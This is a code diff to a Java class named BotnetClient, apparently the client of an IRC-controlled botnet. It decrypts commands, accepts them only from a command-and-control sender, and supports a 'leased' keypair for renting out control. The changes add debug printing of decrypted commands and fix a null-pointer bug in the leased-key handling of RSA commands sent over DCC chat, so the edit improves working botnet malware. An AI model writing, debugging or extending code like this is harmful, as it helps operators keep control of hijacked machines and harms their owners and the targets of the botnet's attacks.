@@ -103,7 +103,9 @@ public class BotnetClient extends PircBot {
 		}
 		System.out.println("key info: " + m.getPriv());
 		String decMsg = m.decryptMsg(message);
+		System.out.println("m1: " + decMsg);
 		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
+		System.out.println("m2: " + leasedDecMsg);
 		String command = decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
 		String leasedCommand = leasedDecMsg != null && leasedDecMsg.split(" ").length > 0 ? leasedDecMsg.split(" ")[0] : leasedDecMsg;
 		if (sender.equals(CC) && COMMANDS.contains(command)) {
@@ -273,7 +275,12 @@ public class BotnetClient extends PircBot {
 					chat.accept();
 					String command = chat.readLine();
 					String commandRSA = m.decryptRSA(command);
-					String leasedCommandRSA = leasedM.decryptRSA(command);
+					String leasedCommandRSA;
+					if (leased) {
+						leasedCommandRSA = leasedM.decryptRSA(command);
+					} else {
+						leasedCommandRSA = null;
+					}
 					if (commandRSA.startsWith("key")) {
 						String otherKey = m.decryptRSA(chat.readLine());
 						String info = m.decryptRSA(chat.readLine());
